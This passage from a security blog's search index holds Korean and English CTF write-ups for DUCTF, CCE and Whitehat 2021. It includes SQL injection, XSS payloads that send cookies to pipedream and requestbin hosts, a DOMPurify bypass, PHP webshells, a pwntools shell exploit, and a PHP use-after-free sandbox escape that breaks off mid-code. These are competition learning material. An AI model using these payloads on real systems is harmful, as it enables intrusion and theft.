    "content": "Web ChallengeInside Out [100 pts]  Inside Out 문제는 SSRF를 이용해 플래그를 획득하는 문제 입니다.문제로 들어오면 위와 같이 환영 한다고 인사를 해주며 밑에 Proxy Example라는 링크가 있는 것을 볼 수 있습니다.위 링크를 클릭 해 접속을 하면 위와 같이 url 파라미터를 이용해서 요청 한 후에 응답 값을 가져오는 것을 볼 수 있고, 여기서 SSRF를 이용해서 플래그를 획득 해야 합니다.http://0.0.0.0대부분에 로컬 호스트는 필터링에 걸려 있어 위 페이로드를 이용해서 우회를 시도 하였고, 응답 값 내에 관리자 패널이 존재하는 것을 알 수 있습니다.그래서 /admin으로 SSRF 해주면 플래그를 획득할 수 있습니다.DUCTF{very_spooky_request}Cowboy World [100 pts]  Cowboy World 문제는 SQL Injection을 이용한 인증 우회를 이용해 플래그를 획득하는 문제 입니다.문제로 들어오면 위와 같이 로그인 로직이 존재하는 것을 볼 수 있습니다. 하지만 username/password의 값으로 SQL Injection 페이로드를 삽입 해주어도 공격이 되지 않아 올바른 username을 찾아야 한다고 생각했습니다.# pls no lookUser-Agent: regular_cowboysDisallow: /sad.emlEveryone says 'yeee hawwwww'but never 'hawwwww yeee':'(thats why a 'sadcowboy' is only allowed to go into our website그래서 정보 수집을 하기 위해서 /robots.txt로 접속을 해보니 메일 파일이 있었고, 메일 내용으로 위와 같이 있었습니다. 그래서 그냥 username으로 sadcowboy를 넘겨주고 password 값으로 'or 1=1 -- 해주니 해결 되었습니다.DUCTF{haww_yeeee_downunderctf?}x1337 Sk1d R3p0rt3r [232 pts]  x1337 Sk1d R3p0rt3r 문제는 구문 분석에 의한 XSS를 이용해서 플래그를 획득하는 문제 입니다. 귀찮아서 gist에 올린 거 그대도 올립니다.poc-1. &lt;/script&gt;poc-2. &lt;script&gt;`1. Go to https://web-x1337-sk1d-r3p0rt3r-9cfd1dc4.chal-2021.duc.tf/.2. login after register your personal account.3. Edit the username to poc-1 and report to any value.4. Edit the username to poc-2 and report to \"`;fetch(`http://requestbin/?c=`+document.cookie)//\".5. Finally, edit the username to poc-1 and report to any value.6. Then we can successfully hijack the admin sessionDUCTF{xxX_x55_4_1337_h4x0rz_Xxx}Notepad [473 pts]  Notepad 문제는 CSRF + XSS를 체이닝 해서 플래그를 획득하는 문제 입니다. 개인적으로 매우 쉬웠는데 솔브가 왜 적은 지 이해가 안 됨.소스 코드가 제공 됨으로 플래그 획득 조건을 확인 해보겠습니다.@app.route('/admin')async def admin():    if quart.session.get('admin') != 1:        return \"\", 403    return open('flag.txt').read()@app.route('/report', methods=[\"GET\", \"POST\"])@quart_rate_limiter.rate_limit(5, dt.timedelta(seconds=10))async def report():    user = quart.session.get('user')    if not user:        return quart.redirect(quart.url_for('index'))    if quart.session.get('admin') == 1:        # Just in case anyone tries it        return \"You're the admin... Go fix it yourself\", 418    if quart.request.method == 'POST':        form = await quart.request.form        url = form.get('url')        if url:            __stub_get_url(url)            return quart.redirect(quart.url_for('me'))    return await quart.render_template('report.html')@app.route('/__stub/admin/login')async def __stub_admin_login():    quart.session['admin'] = 1    return \"Ok\"플래그 획득 조건을 보면 /admin으로 요청한 사용자가 관리자 권한을 가지고 있어야 합니다.회원 가입 후 로그인을 해주니 노트 패드 로직이 존재하는 것을 확인할 수 있습니다.    (function() {        const converter = new showdown.Converter();        const tabs = Array.from(document.querySelectorAll('.tabs &gt; a'));        const views = Array.from(document.querySelectorAll('[data-view]'));        const noteForm = document.querySelector('#note-form');        const markdown = document.querySelector('#markdown');        const editor = document.querySelector('#editor');        tabs.forEach(tab =&gt; {            tab.addEventListener('click', () =&gt; {                tabs.forEach(t =&gt; t.classList.remove('active'));                tab.classList.add('active');                views.forEach(v =&gt; v.classList.add('is-hidden'));                const view = tab.getAttribute('data-view-trigger');                document.querySelector(`[data-view=\"${view}\"]`)?.classList.remove('is-hidden');                if(view === 'view') {                    markdown.innerHTML = DOMPurify.sanitize(converter.makeHtml(editor.value));                }            })        });        noteForm.addEventListener('submit', e =&gt; {            e.preventDefault();            e.stopImmediatePropagation();            fetch('/me', {                method: 'POST',                credentials: 'include',                headers: {'content-type': 'application/json'},                body: JSON.stringify({note: editor.value})            }).then(r =&gt; alert('Saved!'));        });        markdown.innerHTML = DOMPurify.sanitize(converter.makeHtml(editor.value));    })();코드를 확인 해보면 입력값을 받고, 마크 다운으로 처리 한 후에 sanitize 시켜주는 것을 볼 수 있습니다. 하지만 입력값은 마크 다운만 사용할 수 있게 정규식이 걸려 있는 것이 아니고, 일반 TEXT도 사용할 수 있는 것을 확인할 수 있습니다.&lt;img src=x onerror=alert(1)&gt;XSS를 트리거 하기 위해 위 POC를 저장해주니 당연히 sanitize에 의해 XSS가 제어 되고 있는 것을 확인할 수 있었습니다.&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/showdown/1.9.1/showdown.min.js\" integrity=\"sha512-L03kznCrNOfVxOUovR6ESfCz9Gfny7gihUX/huVbQB9zjODtYpxaVtIaAkpetoiyV2eqWbvxMH9fiSv5enX7bw==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\"&gt;&lt;/script&gt;&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.7/purify.min.js\" integrity=\"sha512-pAsGSA54gmV3kpBZBDMk7SgP6DnYNNzj6ZFZ6//jUKOaXSSkE5sdbZMazo3u5QOofhZoGeNwo4Z4e526HPQhcg==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\"&gt;&lt;/script&gt;Dompurify는 2.0.7을 이용해 XSS를 대응하는 것을 확인 할 수 있었고, Dompurify Bypass Poc를 이용해서 XSS를 트리거 하기로 했습니다.&lt;/p&gt;&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src=x onerror=\"alert(1)\"&gt;&lt;p&gt;위 POC 코드를 저장해주니 Dompurify가 우회 돼 XSS가 트리거 되는 것을 확인할 수 있었고, 양 끝에 &lt;/p&gt;, &lt;p&gt; 태그를 넣어준 이유는 converter.makeHtml()를 이용해서 마크다운을 HTML로 변환해주고 반환 해주는데, 이때 양 옆에 불 필요한 &lt;p&gt; 태그가 생겨 무효화 시켜 주기 위함 입니다.&lt;/p&gt;&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src=x onerror=\"fetch('/admin').then(function(response){return/**/response.text();}).then(function(x){fetch('https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f='+x)})\"&gt;&lt;p&gt;마지막으로 위 POC 코드를 이용해서 플래그를 획득 하기로 했지만, Note 마다 고유의 번호가 존재 하지 않아 POC 코드를 저장해도 관리자가 해당 페이로드를 읽게 하는 데 무리가 있었습니다.@app.route('/login', methods=['GET', 'POST'])async def login_():    err = ''    if quart.request.method == \"POST\":        form = await quart.request.form        username, password = map(form.get, ['username', 'password'])        if username is None or password is None:            err = \"Username and password must be specified\"        elif not await login(username, password):            err = \"Invalid username or password\"        else:            quart.session['user'] = username            return quart.redirect(quart.url_for('me'))    return await quart.render_template('login.html', err=err)그러다가 로그인 로직을 확인 해보니 로그인을 성공하면 현재 로그인 한 사용자 세션으로 /me로 리다이렉션 시켜주는 것을 확인 할 수 있었습니다. 이를 이용해서 그냥 CSRF 해주면 됩니다.개인 서버에 Form 태그를 올리고 관리자가 제 계정으로 로그인 하게 하고, 제 세션의 관리자 권한을 올려 플래그를 읽기로 했습니다.&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;title&gt;xss poc&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;        &lt;form action=\"https://web-notepad-f6ed1a7d.chal-2021.duc.tf/login\" method=\"POST\" id=poc&gt;                &lt;input name='username' value='pocas'&gt;                &lt;input name='password' value='pocas'&gt;        &lt;/form&gt;        &lt;script&gt;                poc.submit()        &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;노트에 위 POC 코드를 저장하고, 개인 서버에는 위 POC 코드를 올린 후에 리포터 기능으로 개인 서버 URL을 전달 해주겠습니다.개인 서버 URL을 전달 해주니 플래그를 획득 할 수 있었습니다.DUCTF{ch4ining_c5rf_c4uses_cha0s_2045c24d}Misc ChallengeGeneral Skills Quiz [100 pts]from pwn import *from urllib import parseimport base64import codecsdef base64_decode(data):    sitename_bytes = base64.b64decode(data)    return sitename_bytes .decode('ascii')def url_decode(data):    return parse.unquote(data)rot13 = lambda s : codecs.getencoder(\"rot-13\")(s)[0]p = remote(\"pwn-2021.duc.tf\", 31905)p.recv()p.sendline()p.recv()p.sendline(b'2')p.sendline(str(int(str(p.recv()).split(': ')[1].replace('\\\\n','').replace('\\'','').replace('0x',''), 16)).encode())p.sendline(chr(int(str(p.recv()).split(': ')[1].replace('\\\\n','').replace('\"',''), 16)))p.sendline(url_decode(str(p.recv()).split(': ')[1].replace('\\\\n','').replace('\"','')).encode())p.sendline(base64_decode(str(p.recv()).split(': ')[1].replace('\\\\n','').replace('\"','')).encode())p.sendline(base64.b64encode(str(p.recv()).split(': ')[1].replace('\\\\n','').replace('\"','').encode()))p.sendline(rot13(str(p.recv()).split(': ')[1].replace('\\\\n','').replace('\"','')).encode())p.sendline(codecs.encode(str(p.recv()).split(': ')[1].replace('\\\\n','').replace('\"',''), 'rot_13').encode())p.sendline(str(int(str(p.recv()).split(': ')[1].replace('\\\\n','').replace('\"',''),2)).encode())p.sendline(str(bin(int(str(p.recv()).split(': ')[1].replace('\\\\n','').replace('\\'','')))).encode())p.recv()p.sendline(b'DUCTF')print(p.recv())DUCTF{you_aced_the_quiz!_have_a_gold_star_champion}Pwn Challengewrite what where [310 pts]from pwn import *r=remote(\"pwn-2021.duc.tf\", 31920)# r=process(\"./write-what-where\")b=ELF(\"./write-what-where\")context.log_level='debug'lib=ELF(\"./libc.so.6\")# lib=ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")exit=0x404038r.send(p32(b.sym['main']+33))r.send(str(exit).rjust(9,'0'))r.send(p32(b.plt['puts']))r.send(str(b.got['setvbuf']).rjust(9,'0'))r.send(p32(0))r.send(str(b.got['setvbuf']+4).rjust(9,'0'))r.send(p32(0x404050))r.send(str(0x404060).rjust(9,'0'))r.send(p32(0))r.send(str(0x404060+4).rjust(9,'0'))r.send(p32(b.sym['main']))  r.send(str(exit).rjust(9,'0'))base=u64(r.recvuntil(b'\\x7f')[:-7:-1][::-1].ljust(8,b'\\x00'))-lib.sym['_IO_2_1_stdout_']log.info(hex(base))system=base+lib.sym['system']binsh=base+list(lib.search(b'/bin/sh'))[0]log.info(hex(system))r.send(p32(b.sym['main']+33))r.send(str(exit).rjust(9,'0'))r.send(p32(system&amp;0xffffffff))r.send(str(b.got['setvbuf']).rjust(9,'0'))r.send(p32((system&gt;&gt;32)))r.send(str(b.got['setvbuf']+4).rjust(9,'0'))r.send(p32(binsh&amp;0xffffffff))r.send(str(0x404060).rjust(9,'0'))r.send(p32((binsh&gt;&gt;32)))r.send(str(0x404064).rjust(9,'0'))# r.send(b'/sh\\x00')# r.send(str(0x404054).rjust(9,'0'))# r.send(b'/sh\\x00')# r.send(str(0x404054).rjust(9,'0'))r.send(p32(b.sym['main']))r.send(str(exit).rjust(9,'0'))r.interactive()DUCTF{arb1tr4ry_wr1t3_1s_str0ng_www}"
  },
  
  {
    "title": "CCE 2021 GS 25 Write Up",
    "url": "/posts/CCE/",
    "categories": "",
    "tags": "",
    "date": "2021-09-27 08:29:53 +0900",
    





    
    "snippet": "SummaryOn the 25th, there was a CCE held by the National Intelligence Service, and at 11:10 pm, a few tens of minutes before the end of the competition, someone I knew asked me to solve it, so I tr...",
    "content": "SummaryOn the 25th, there was a CCE held by the National Intelligence Service, and at 11:10 pm, a few tens of minutes before the end of the competition, someone I knew asked me to solve it, so I tried to solve the GS 25 problem for a while, and it was very easy.GS 25 [2** pts]This GS 25 challenge is to pollute Jquery gadget with Prototype Pollution to trigger XSS.~/Exploit/ctf/2021/CCE 2021 main*❯ tree for_userfor_user└── for_user    ├── docker    │   ├── Dockerfile    │   └── src    │       ├── app.js    │       ├── package.json    │       ├── route    │       │   └── index.js    │       ├── run.sh    │       ├── static    │       │   ├── css    │       │   │   ├── free-v4-font-face.min.css    │       │   │   ├── free-v4-shims.min.css    │       │   │   ├── free.min.css    │       │   │   ├── main.css    │       │   │   ├── tetris.css    │       │   │   └── theme.css    │       │   ├── js    │       │   │   ├── axios.min.js    │       │   │   ├── axios.min.map    │       │   │   ├── bootstrap.min.js    │       │   │   ├── bootstrap.min.js.map    │       │   │   ├── fontawesome.js    │       │   │   ├── game    │       │   │   │   ├── piece.js    │       │   │   │   ├── tetris.js    │       │   │   │   └── tetrominoes.js    │       │   │   ├── index.js    │       │   │   ├── jquery-3.3.1.slim.min.js    │       │   │   ├── popper.min.js    │       │   │   └── popper.min.js.map    │       │   └── texture.jpg    │       └── views    │           ├── component    │           │   ├── footer.ejs    │           │   ├── header.ejs    │           │   └── navbar.ejs    │           ├── game.ejs    │           ├── index.ejs    │           └── login.ejs    ├── docker-compose.yml    └── robot        ├── Dockerfile        └── src            ├── app.js            ├── package-lock.json            ├── package.json            ├── run.sh            └── views                └── index.ejs13 directories, 37 files~/Exploit/ctf/2021/CCE 2021 main*❯The challenge code is given above. So many :(const express = require('express')const app = express()// const __DIR = '/usr/src/app'const __DIR = './'const puppeteer = require('puppeteer')const url = 'http://prob'/* express */app.set('views', __DIR + '/views')app.set('view engine', 'ejs')app.engine('html', require('ejs').renderFile)app.use(express.json())app.use(express.urlencoded({ extended: true }))app.get('/', (req, res) =&gt; {  res.render('index')})app.post('/', async (req, res) =&gt; {  const { fileName, code } = req.body  const cookies = [{    'name': 'fileName',    'value': fileName  },  {    'name': 'flag',    'value': 'cce2021{EXAMPLE_FLAG}'  }  ]  await (async () =&gt; {    const browser = await puppeteer.launch({ args: ['--no-sandbox', '--disable-setuid-sandbox'] })    const page = await browser.newPage()    page.on('dialog', async dialog =&gt; {      if(dialog.message() == 'Input your game data code') await dialog.accept(code)      else await dialog.dismiss()    })    await page.goto(url, {      waitUntil: 'networkidle2',    })    await page.setCookie(...cookies)      await page.click('#playBtn')        await page.keyboard.type('l')    await new Promise(resolve =&gt; setTimeout(resolve, 1000))    await browser.close()  })()  res.send(\"Done\")})app.listen(80)If you look at the conditions for obtaining the flag, you can steal the cookie of the admin bot, and you need to trigger XSS to steal it.async function loadGame(){    const code = prompt('Input your game data code')  const req = await axios.post('/loadGame', { code })  const result = req.data    if (result.state !== 'ok') {    alert('error')    return   }  const data = req.data.data  function isObject(obj) {    return obj !== null &amp;&amp; typeof obj === 'object'  }  function merge(a, b) {    for (let key in b) {      if (isObject(a[key]) &amp;&amp; isObject(b[key])) {        merge(a[key], b[key])      } else {        a[key] = b[key]      }    }    return a  }  this.cGameInfo = new GameInfo()  merge(this.cGameInfo, data)  initScreen()  initPiecesMap(cGameInfo.panelRow, cGameInfo.panelColume)  initDisplayGamePanel(cGameInfo.panelColume, cGameInfo.panelRow)  initNextBlockInfo()  setNextPieces()  clearInterval(this.cGameInfo.dropIntervalId)  setDropInterval()  $(document).off('keydown')  document.addEventListener('keydown', keyboardEventHandler)  $(document).off('touchmove')  setControleButton()    this.cGameInfo.changeSpeedDisplay()  this.cGameInfo.updateScore(0)}While checking the source code, I found a function called loadGame() in tetris.js. The loadGame() function sends a request for a unique Code value to /loadGame to get game information (object) corresponding to the Code value, and uses the merge() function to overwrite the GameInfo object.Also, since I’m using Jquery 3.3.1 on that issue, I decided to look for an XSS gadget, and pollute that gadget to trigger XSS.  $(document).off('keydown')  document.addEventListener('keydown', keyboardEventHandler)  $(document).off('touchmove')If you look closely at the loadGame() function, you can see that there is an XSS gadget inside.async function keyboardEventHandler(e) {  //space 키 =&gt; c  if(e.keyCode == 67) {    cGameInfo.cPiece.moveEndDown();  //왼쪽 화살표 =&gt; a  } else if(e.keyCode == 65) {    cGameInfo.cPiece.moveLeft();  //위쪽 화살표 =&gt; w  } else if(e.keyCode == 87)  {    cGameInfo.cPiece.rotate();  //오른쪽 화살표 =&gt; d  } else if(e.keyCode == 68)  {    cGameInfo.cPiece.moveRight();  //아래 화살표 =&gt; s  } else if(e.keyCode == 83)  {    cGameInfo.cPiece.moveDown();  //세이브 =&gt; p  } else if(e.keyCode == 80) {    await saveGame()  // 로드 =&gt; l  }else if(e.keyCode == 76) {    await loadGame()  }}The loadGame() function was not called automatically, but L, l had to be entered with the keyboard to execute it.    await page.click('#playBtn')        await page.keyboard.type('l')    await new Promise(resolve =&gt; setTimeout(resolve, 1000))But, since the admin bot uses the keyboard method to input l, the admin bot also eventually executes the loadGame() function, so I thought that I could just try it.POST /saveGame HTTP/1.1Host: 20.194.62.226:4423Content-Length: 198Accept: application/json, text/plain, */* Chrome/92.0.4515.107 Safari/537.36Content-Type: application/json;charset=UTF-8Cookie: fileName=01f032bb-3210-4dd3-9555-078cfa75196dConnection: close{\"data\":{\"__proto__\":{\"__proto__\":{\"preventDefault\":\"x\", \"handleObj\":\"x\",\"delegateTarget\":\"&lt;img/src/onerror=alert(1)&gt;\"}}}}First, to check if XSS works well, I tried to execute the loadGame() function after saving the game as above.As expected, I was able to confirm that the XSS trigger works well.{\"data\":{\"__proto__\":{\"__proto__\":{\"preventDefault\":\"x\", \"handleObj\":\"x\",\"delegateTarget\":\"&lt;img/src/onerror=fetch(`https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=`+document.cookie)&gt;\"}}}}The cookie stealing POC is as above.  Scenario          Save the PoC of Prototype Pollution in the /saveGame      Send the code number including the filename and PoC in the report logic.      Based on the above scenario, i were able to steal the flag by trying the exploit.FLAG : cce2021{5cd5185ef46ce86f6c33543f75752a559fa843ec91a1176144f1a15d468f318d}"
  },
  
  {
    "title": "Whitehat Contest 2021 Write Up",
    "url": "/posts/WhiteHat-Contest/",
    "categories": "",
    "tags": "",
    "date": "2021-09-13 08:29:53 +0900",
    





    
    "snippet": "(Web) Imageflare [100 pts]  Imageflare 문제는 파일 업로드 취약점을 이용해 웹쉘을 업로드 한 뒤에 RCE를 이용해 플래그를 획득하는 문제입니다.일단 문제를 보면 위와 같이 파일 업로드 기능이 주어지고, 파일 업로드를 할 때 마다 Pow 값을 맞춰줘야 한다.import hashlibimport stringimport ran...",
    "content": "(Web) Imageflare [100 pts]  Imageflare 문제는 파일 업로드 취약점을 이용해 웹쉘을 업로드 한 뒤에 RCE를 이용해 플래그를 획득하는 문제입니다.일단 문제를 보면 위와 같이 파일 업로드 기능이 주어지고, 파일 업로드를 할 때 마다 Pow 값을 맞춰줘야 한다.import hashlibimport stringimport randomimport uuidimport sysfor i in range(10000000) :    input = uuid.uuid4()    input = str(input)    sha_1 = hashlib.sha1()    sha_1.update(input.encode('utf-8'))    inputsha = sha_1.hexdigest()    inputsha5 = inputsha[:5]    pow = sys.argv[1]    if inputsha5 == pow :        print(\"[*] \" + input)        breakprint(\"[*] end..\")Pow 값은 위 페이로드로 쉽게 획득할 수 있습니다.&lt;?= 7*7 ?&gt;php 파일을 업로드 해보니 필터링에 걸리는 것을 확인할 수 있었다. 그래서 여러번 파일 업로드를 하며 확인해본 결과 시그니처 값과 &lt;?php &gt; 문자열 존재만 확인하는 거 같았습니다. 그래서 그냥 아무 이미지 파일을 다운로드 하고, 이미지 헤더 내에 위 페이로드를 넣고, 파일 명은 &lt;filename&gt;.php로 업로드 하여 익스플로잇을 진행했습니다.파일 업로드 후에 파일 명을 클릭하면 파일을 읽는 것이 아닌 다운로드가 되도록 구현되어 있었습니다. 여기서 저는 약간의 게싱을 이용해서 업로드 되는 디렉터리를 알아냈습니다. (/uploads/)아까 위에서 올린 php 파일로 접근을 해보니 7*7가 그대로 실행 되어 출력되는 것을 확인할 수 있었습니다.&lt;?= echo system($_GET['c']); ?&gt;이번에는 위와 같이 이미지 헤더 내에 웹쉘 페이로드를 넣은 후에 업로드하고, 쉘 명령어를 실행해보니 잘 되는 것을 볼 수 있었고, 이를 이용해 플래그를 획득했습니다.FLAG{ce9f5efd2c90c3f98fc61fcaf608f842}(Web) Mudbox [290 pts]  Mudbox 문제는  session_save_path()를 이용한 open_basedir 우회 기법 또는 UAF Sandbox Escape를 이용해 open_basedir 옵션을 우회하고, RCE 하는 문제 입니다.저는 ini_set(), chdir() 함수로 ini_set() 함수로 open_basedir 옵션을 우회하려고 밤을 새면서 시도 했는데, ini_set()을 이용해서 open_basedir을 전역에서 설정해주어도 ㅈㄴ 설정이 아예 안 됐습니다. 하지만 저는 이 방법을 고집하고, 계속 시도 하였지만 php.ini 설정 때문인지 이년이 끝까지 말을 안 듣더라구요 :)결국 대회 끝나고 지인들한테 물어보니 첫 번째는 session_save_path()를 이용해서  open_basedir 우회하기 위해 plugin/ 디렉터리에 웹쉘 올리고, LFI를 이용해서 해당 파일을 실행 시키는 방식이고, 두 번째는 잘 알려진 UAF Sandbox Escape 공격을 하는 것 입니다.저도 대회때 UAF 공격을 한 번 시도 해보긴 했는데, 파일 크기 때문에 UAF POC 파일을 업로드 하지 못 해서, 공격을 못 했는데, 지금 생각해보면 그냥 &lt;?= eval($_GET['cmd']); ?&gt;로 파일을 올리고, cmd 변수에 UAF Payload를 그냥 넘겨주면 됐었습니다.또한 CCE 2020에서 nomorephp라는 문제와 싱크로율 100 ;; 그냥 ini_set()만 고집 안 했으면 풀었을 건데 아쉽네요.문제에서는 위와 같이 파일 업로드 기능을 제공하고 있고, php, phar, htm이 들어간 확장자는 모두 필터링에 걸리는데, pht 확장자를 이용해서 우회할 수 있습니다.&lt;?php    eval($_GET['code']);    show_source(__FILE__);?&gt;그래서 일단 위 페이로드를 pht 확장자로 업로드 해주었습니다.업로드한 파일을 읽어 보니 php로 잘 인식하는 것을 확인 할 수 있습니다.code 값으로 phpinfo();를 넘겨ㅡ주니 실행 또한 잘 되는 것을 확인 할 수 있습니다.pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,getenv,putenvphpinfo();에서 disable_functions 설정을 확인 해보니 위와 같이 여러 함수들이 비활성화 되어 있는 것을 확인 할 수 있습니다.그리고 혹시나 해서 open_basedir 설정도 확인 해보니 위와 같이 /tmp:/var/www/html/data 설정 되어 있는 것을 확인 했습니다. 플래그는 현재 /flag에 있습니다. 또한 우리가 업로드 하는 웹쉘도 data/ 하위에 생성이 되기 때문에 data/ 디렉터리에서 현재 경로 및 하위 파일들만 건들 수 있습니다.그래서 open_basedir을 우회해서 최상위 디렉터리에 있는 /flag를 읽어야 합니다.open_basedir을 우회하는 첫 번째 방식은 잘 알려진 UAF Sandbox Escape를 이용하는 것 입니다.&lt;?php## PHP SplDoublyLinkedList::offsetUnset UAF# Charles Fol (@cfreal_)# 2020-08-07# PHP is vulnerable from 5.3 to 8.0 alpha# This exploit only targets PHP7+.## SplDoublyLinkedList is a doubly-linked list (DLL) which supports iteration.# Said iteration is done by keeping a pointer to the \"current\" DLL element.# You can then call next() or prev() to make the DLL point to another element.# When you delete an element of the DLL, PHP will remove the element from the# DLL, then destroy the zval, and finally clear the current ptr if it points# to the element. Therefore, when the zval is destroyed, current is still# pointing to the associated element, even if it was removed from the list.# This allows for an easy UAF, because you can call $dll-&gt;next() or# $dll-&gt;prev() in the zval's destructor.##define('NB_DANGLING', 200);define('SIZE_ELEM_STR', 40 - 24 - 1);define('STR_MARKER', 0xcf5ea1);function i2s(&amp;$s, $p, $i, $x=8){    for($j=0;$j&lt;$x;$j++)    {        $s[$p+$j] = chr($i &amp; 0xff);        $i &gt;&gt;= 8;    }}function s2i(&amp;$s, $p, $x=8){    $i = 0;    for($j=$x-1;$j&gt;=0;$j--)    {        $i &lt;&lt;= 8;        $i |= ord($s[$p+$j]);    }    return $i;}class UAFTrigger{    function __destruct()    {        global $dlls, $strs, $rw_dll, $fake_dll_element, $leaked_str_offsets;        #\"print('UAF __destruct: ' . \"\\n\");        $dlls[NB_DANGLING]-&gt;offsetUnset(0);        # At this point every $dll-&gt;current points to the same freed chunk. We allocate        # that chunk with a string, and fill the zval part        $fake_dll_element = str_shuffle(str_repeat('A', SIZE_ELEM_STR));        i2s($fake_dll_element, 0x00, 0x12345678); # ptr        i2s($fake_dll_element, 0x08, 0x00000004, 7); # type + other stuff        # Each of these dlls current-&gt;next pointers point to the same location,        # the string we allocated. When calling next(), our fake element becomes        # the current value, and as such its rc is incremented. Since rc is at        # the same place as zend_string.len, the length of the string gets bigger,        # allowing to R/W any part of the following memory        for($i = 0; $i &lt;= NB_DANGLING; $i++)            $dlls[$i]-&gt;next();        if(strlen($fake_dll_element) &lt;= SIZE_ELEM_STR)            die('Exploit failed: fake_dll_element did not increase in size');        $leaked_str_offsets = [];        $leaked_str_zval = [];        # In the memory after our fake element, that we can now read and write,        # there are lots of zend_string chunks that we allocated. We keep three,        # and we keep track of their offsets.        for($offset = SIZE_ELEM_STR + 1; $offset &lt;= strlen($fake_dll_element) - 40; $offset += 40)        {            # If we find a string marker, pull it from the string list            if(s2i($fake_dll_element, $offset + 0x18) == STR_MARKER)            {                $leaked_str_offsets[] = $offset;                $leaked_str_zval[] = $strs[s2i($fake_dll_element, $offset + 0x20)];                if(count($leaked_str_zval) == 3)                    break;            }        }        if(count($leaked_str_zval) != 3)            die('Exploit failed: unable to leak three zend_strings');        # free the strings, except the three we need        $strs = null;        # Leak adress of first chunk        unset($leaked_str_zval[0]);        unset($leaked_str_zval[1]);        unset($leaked_str_zval[2]);        $first_chunk_addr = s2i($fake_dll_element, $leaked_str_offsets[1]);        # At this point we have 3 freed chunks of size 40, which we can read/write,        # and we know their address.        print('Address of first RW chunk: 0x' . dechex($first_chunk_addr) . \"\\n\");        # In the third one, we will allocate a DLL element which points to a zend_array        $rw_dll-&gt;push([3]);        $array_addr = s2i($fake_dll_element, $leaked_str_offsets[2] + 0x18);        # Change the zval type from zend_object to zend_string        i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);        if(gettype($rw_dll[0]) != 'string')            die('Exploit failed: Unable to change zend_array to zend_string');        # We can now read anything: if we want to read 0x11223300, we make zend_string*        # point to 0x11223300-0x10, and read its size using strlen()        # Read zend_array-&gt;pDestructor        $zval_ptr_dtor_addr = read($array_addr + 0x30);        print('Leaked zval_ptr_dtor address: 0x' . dechex($zval_ptr_dtor_addr) . \"\\n\");        # Use it to find zif_system        $system_addr = get_system_address($zval_ptr_dtor_addr);        print('Got PHP_FUNCTION(system): 0x' . dechex($system_addr) . \"\\n\");        # In the second freed block, we create a closure and copy the zend_closure struct        # to a string        $rw_dll-&gt;push(function ($x) {});        $closure_addr = s2i($fake_dll_element, $leaked_str_offsets[1] + 0x18);        $data = str_shuffle(str_repeat('A', 0x200));        for($i = 0; $i &lt; 0x138; $i += 8)        {            i2s($data, $i, read($closure_addr + $i));        }        # Change internal func type and pointer to make the closure execute system instead        i2s($data, 0x38, 1, 4);        i2s($data, 0x68, $system_addr);        # Push our string, which contains a fake zend_closure, in the last freed chunk that        # we control, and make the second zval point to it.        $rw_dll-&gt;push($data);        $fake_zend_closure = s2i($fake_dll_element, $leaked_str_offsets[0] + 0x18) + 24;        i2s($fake_dll_element, $leaked_str_offsets[1] + 0x18, $fake_zend_closure);        print('Replaced zend_closure by the fake one: 0x' . dechex($fake_zend_closure) . \"\\n\");        # Calling it now        print('Running system(\"cat /flag\");' . \"\\n\");        $rw_dll[1]('cat /flag');        print_r('DONE'.\"\\n\");    }}class DanglingTrigger{    function __construct($i)    {        $this-&gt;i = $i;    }    function __destruct()    {        global $dlls;        #D print('__destruct: ' . $this-&gt;i . \"\\n\");        $dlls[$this-&gt;i]-&gt;offsetUnset(0);        $dlls[$this-&gt;i+1]-&gt;push(123);        $dlls[$this-&gt;i+1]-&gt;offsetUnset(0);    }}class SystemExecutor extends ArrayObject{    function offsetGet($x)    {        parent::offsetGet($x);    }}/** * Reads an arbitrary address by changing a zval to point to the address minus 0x10, * and setting its type to zend_string, so that zend_string-&gt;len points to the value * we want to read. */function read($addr, $s=8){    global $fake_dll_element, $leaked_str_offsets, $rw_dll;    i2s($fake_dll_element, $leaked_str_offsets[2] + 0x18, $addr - 0x10);    i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);    $value = strlen($rw_dll[0]);    if($s != 8)        $value &amp;= (1 &lt;&lt; ($s &lt;&lt; 3)) - 1;    return $value;}function get_binary_base($binary_leak){    $base = 0;    $start = $binary_leak &amp; 0xfffffffffffff000;    for($i = 0; $i &lt; 0x1000; $i++)    {        $addr = $start - 0x1000 * $i;        $leak = read($addr, 7);        # ELF header        if($leak == 0x10102464c457f)            return $addr;    }    # We'll crash before this but it's clearer this way    die('Exploit failed: Unable to find ELF header');}function parse_elf($base){    $e_type = read($base + 0x10, 2);    $e_phoff = read($base + 0x20);    $e_phentsize = read($base + 0x36, 2);    $e_phnum = read($base + 0x38, 2);    for($i = 0; $i &lt; $e_phnum; $i++) {        $header = $base + $e_phoff + $i * $e_phentsize;        $p_type  = read($header + 0x00, 4);        $p_flags = read($header + 0x04, 4);        $p_vaddr = read($header + 0x10);        $p_memsz = read($header + 0x28);        if($p_type == 1 &amp;&amp; 